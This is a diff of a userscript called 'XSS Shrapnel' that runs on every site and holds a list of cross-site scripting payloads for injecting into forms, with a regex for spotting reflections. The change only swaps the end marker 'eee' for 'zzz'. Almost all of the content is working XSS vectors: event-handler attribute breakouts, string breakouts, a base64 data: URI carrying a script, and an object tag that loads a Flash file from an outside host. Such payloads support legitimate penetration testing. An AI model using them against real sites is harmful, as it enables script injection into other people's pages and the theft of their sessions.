@@ -1,7 +1,7 @@
 // ==UserScript==
 // @name        XSS Shrapnel
 // @namespace   *
-// @description aaa"bbb'ccc<ddd>eee
+// @description aaa"bbb'ccc<ddd>zzz
 // @include     *
 // @version     2.3
 // @grant       none
@@ -12,23 +12,23 @@ var bFillHiddenForms = 0
 
 var iPayload = 0
 
-var aPayloads = ['aaa"bbb\'ccc<ddd>eee', 
-		 'aaa"bbb\'eee', 
-		 'aaa"eee', 
-		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>eee<fff', 
-		 'aaa\\"bbb\\\'ccc<ddd >eee</fff>', 
-		 '</title></textarea>aaa"bbb\'ccc<ddd>eee', 
-		 'aaa"><svg onload=alert(document.domain)>eee', 
-		 'aaa" autofocus onfocus="alert(document.domain)"eee', 
-		 'aaa" onmouseover="alert(document.domain)"eee', 
-		 'aaa" accesskey=x onclick="alert(document.domain)"eee', 
-		 'aaa\'-alert(document.domain)-\'eee', 
-		 'aaa"-alert(document.domain)-"eee', 
-		 'aaa"><video src onratechange=prompt(document.domain)>eee', 
-		 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf"></object>eee', 
-		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>eee']
+var aPayloads = ['aaa"bbb\'ccc<ddd>zzz', 
+		 'aaa"bbb\'zzz', 
+		 'aaa"zzz', 
+		 'aaa\\"bbb\\\'>ccc<<ddd>ddd<ddd>>zzz<fff', 
+		 'aaa\\"bbb\\\'ccc<ddd >zzz</fff>', 
+		 '</title></textarea>aaa"bbb\'ccc<ddd>zzz', 
+		 'aaa"><svg onload=alert(document.domain)>zzz', 
+		 'aaa" autofocus onfocus="alert(document.domain)"zzz', 
+		 'aaa" onmouseover="alert(document.domain)"zzz', 
+		 'aaa" accesskey=x onclick="alert(document.domain)"zzz', 
+		 'aaa\'-alert(document.domain)-\'zzz', 
+		 'aaa"-alert(document.domain)-"zzz', 
+		 'aaa"><video src onratechange=prompt(document.domain)>zzz', 
+		 'aaa"><object allowscriptaccess="always" data="http://spqr.zz.mu/xss.swf">zzz', 
+		 'aaa"><a href=data:xxx;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+>XSS</a>zzz']
 
-var regex = /.{0,100}aaa.{0,130}?eee.{0,100}/gi
+var regex = /.{0,100}aaa.{0,130}?zzz.{0,100}/gi
 
 window.addEventListener
 (
